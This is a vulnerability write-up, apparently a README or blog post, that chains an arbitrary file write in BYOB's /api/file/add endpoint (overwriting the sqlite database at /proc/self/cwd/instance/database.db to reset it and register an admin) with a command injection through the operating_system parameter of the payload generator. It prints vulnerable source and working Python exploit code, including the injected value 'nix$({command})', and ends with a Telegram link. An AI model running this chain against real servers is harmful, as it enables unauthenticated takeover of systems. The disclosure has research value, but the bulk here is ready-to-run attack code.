### BYOB (Build Your Own Botnet) Unauthenticated RCE

This exploit works by spoofing an agent exfiltrating a file to overwrite the sqlite database and bypass authentication.  After authentication is bypassed, a command injection vulnerability is exploited in the payload builder page.

Summary
BYOB (Build Your Own Botnet) is an open-source post-exploitation framework for students, researchers and developers with support for Linux, Windows and OSX systems. With approximately 9,000 stars, it ranks among the most popular post exploitation frameworks on GitHub. While auditing the codebase, I was able to discover an unauthenticated arbitrary file write in an exfiltration endpoint allowing attackers to overwrite the sqlite database on disk and bypass authentication. With authenticated access to the botnet panel, I discovered a command injection in the payload generation page. By chaining these vulnerabilities, remote unauthenticated attackers are able to take full control over the botnet server.

Arbitrary File Write via agent exfiltration endpoint
Reminiscent of the Skywalker in vulnerability in Empire C2 disclosed by @zeroSteiner and re-exploited by AceResponder, BYOB saves exfiltrated files from agents in an insecure manner, allowing attackers to write files anywhere on the filesystem the user who is running the application has the permission to write to. Specifically, BYOB makes use of the os.path.join function, which is well known to create scenarios where directory traversal is possible.

Lets take a look at the code (which I have trimmed down for brevity) for the /api/file/add route, which exists in web-gui/buildyourownbotnet/api/files/routes.py. We can see this route accepts unauthenticated POST requests, and accepts a filename parameter. This filename parameter is passed as the final parameter in the output_path variable, allowing us to take full control over the output_path variable irregardless of previous parameters by passing a full path (ex: filename=/tmp/win.txt). Futhermore, the route accepts a data parameter, which is to be base64-decoded and written to output_path. This gives way to our arbitrary file write.

@files.route("/api/file/add", methods=["POST"])
def file_add():
	"""Upload new exfilrated file."""
	b64_data = request.form.get('data')
	...
	filename = request.form.get('filename')

	# decode any base64 values
	try:
		data = base64.b64decode(b64_data)
	except:
		if b64_data.startswith('_b64'):
			data = base64.b64decode(b64_data[6:]).decode('ascii')
		else:
			print('/api/file/add error: invalid data ' + str(b64_data))
			return
	...
	
	output_path = os.path.join(os.getcwd(), 'buildyourownbotnet/output', owner, 'files', filename)

	# add exfiltrated file to database
	file_dao.add_user_file(owner, filename, session, module)

	# save exfiltrated file to user directory
	with open(output_path, 'wb') as fp:
		fp.write(data)

	return filename
We need to use this arbitrary file write to RCE now. There are a lot of ways to do this but ideally:
- Our path does not rely on the application running with elevated/root permissions (writing to /etc/cron.d)
- Our path relies on system event (login->.bashrc, overwriting app source files and waiting for reload)
- Our path requires no end user interation (adding an XSS payload to an application .js file)

The best way I found to achieve this is to overwrite the sqlite3 database that exists on file to one with empty tables. This resets the application to its initial installation state, and allows us to register an admin user as part of the setup process. We make use of procfs to determine the working directory of the application, from which we can find the location of the database (/proc/self/cwd/instance/database.db). The downside of doing this is the botnets owners will probably notice not being able to login.

This is what overwriting the database and registering a new user looks like in python code:

with open('database.db', 'rb') as f:
	bindata = f.read()
data = base64.b64encode(bindata).decode('ascii')
json_data = {'data': data, 'filename': '/proc/self/cwd/instance/database.db', 'type': "txt", 'owner': "admin", "module": "icloud", "session": "lol"}
headers = {
	'Content-Length': str(len(json.dumps(json_data)))
}
print("[***] Uploading database")
upload_response = session.post(f"{url}/api/file/add", data=json_data, headers=headers)
print(upload_response.status_code)


headers = {
	'User-Agent': user_agent,
	'Content-Type': 'application/x-www-form-urlencoded',
}
data = {
	'csrf_token': register_csrf,
	'username': username,
	'password': password,
	'confirm_password': password,
	'submit': 'Sign Up'
}
print("[***] Registering user   ")
regsiter_response = s.post(f'{url}/register', headers=headers, data=data)
print(regsiter_response.status_code)
Command Injection via payload generation page
The payload generation page accepts a format, operating system and architecture parameter.

meow1

This page will POST to the /api/payload/generate page, which will accept the payloda_format, operating_system, and architecture parameters. These parameters will be put into an options directory and passed to the client.py main() function.

@payload.route("/api/payload/generate", methods=["POST"])
@login_required
def payload_generate():
	"""Generates custom client scripts."""

	# required fields
	payload_format = request.form.get('format')
	operating_system = request.form.get('operating_system')
	architecture = request.form.get('architecture')

	...

	# write dropper to user's output directory and return client creation page
	options = {
		'encrypt': encrypt,
		'compress': compress, 
		'freeze': freeze, 
		'gui': 1, 
		'owner': current_user.username, 
		'operating_system': operating_system, 
		'architecture': architecture
	}

	try:
		outfile = client.main('', '', '', '', '', '', **options)

		...
In the main function, these options are processed and passed to the _dropper() function.

# main
def main(*args, **kwargs):
    """
    Run the generator

    """

    if not kwargs:
	...
    else:

        options = collections.namedtuple('Options', ['host','port','modules','name','icon','pastebin','encrypt','compress','freeze','gui','owner','operating_system','architecture'])(*args, **kwargs)

    ...
    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)

    os.chdir('..')

    return dropper
The _dropper function, which is responsible for generating the dropper, constructs the name variable which is the output path for our generated droppers. We notice that options.operating_system and options.architecture are used in the construction of the name variable. If the name variable ever gets passed to a subprocess.Popen call, we will be able to inject commands. We can see that if options.freeze is set to true (which is the case when you request to generate a binary dropper rather than a .py dropper), the generators.freeze() function will be called.

def _dropper(options, **kwargs):
    # add os/arch info to filename if freezing
    if options.freeze:
        name = 'byob_{operating_system}_{architecture}_{var}.py'.format(operating_system=options.operating_system, architecture=options.architecture, var=kwargs['var']) if not options.name else options.name
    else:
        name = 'byob_{var}.py'.format(var=kwargs['var'])

	...

    name = os.path.join(output_dir, name)

	...

    # cross-compile executable for the specified os/arch using pyinstaller docker containers
    if options.freeze:
        util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'], owner=options.owner, operating_system=options.operating_system, architecture=options.architecture)
        util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
    return name
In the freeze() function, the operating_system parameter and architecture parameter are passed directly into subprocess.Popen(), without any sanatization or validation whatsoever.

def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, architecture=None):
    """
    Compile a Python file into a standalone executable
    binary with a built-in Python interpreter

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string

    """
	...

    # cross-compile executable for the specified os/arch using pyinstaller docker containers
    process = subprocess.Popen('docker run -v "$(pwd):/src/" {docker_container}'.format(
                                src_path=os.path.dirname(path), 
                                docker_container=operating_system + '-' + architecture), 
                                0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, 
                                cwd=path, 
                                shell=True)
Exploiting this in python code is quite trivial. This completes our unauthenticated RCE chain!

headers = {
	'User-Agent': user_agent,
	'Content-Type': 'application/x-www-form-urlencoded',
}
data = f'format=exe&operating_system=nix$({command})&architecture=amd64'
try:
	# Authenticated session
	s.post(f'{url}/api/payload/generate', headers=headers, data=data, stream=True, timeout=0.0000000000001)
except requests.exceptions.ReadTimeout:
	pass

### Telegram :
Link : https://t.me/neverstare
